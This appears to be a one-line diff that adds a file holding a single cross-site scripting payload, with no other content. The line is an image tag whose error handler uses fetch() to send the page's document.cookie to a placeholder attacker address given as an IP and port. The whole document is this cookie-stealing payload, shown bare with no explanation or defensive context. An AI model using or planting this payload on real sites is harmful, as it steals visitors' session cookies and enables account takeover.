@@ -1,0 +1,1 @@
+<img src=x onerror=fetch("http://<ip>:<port>/"+document.cookie);>
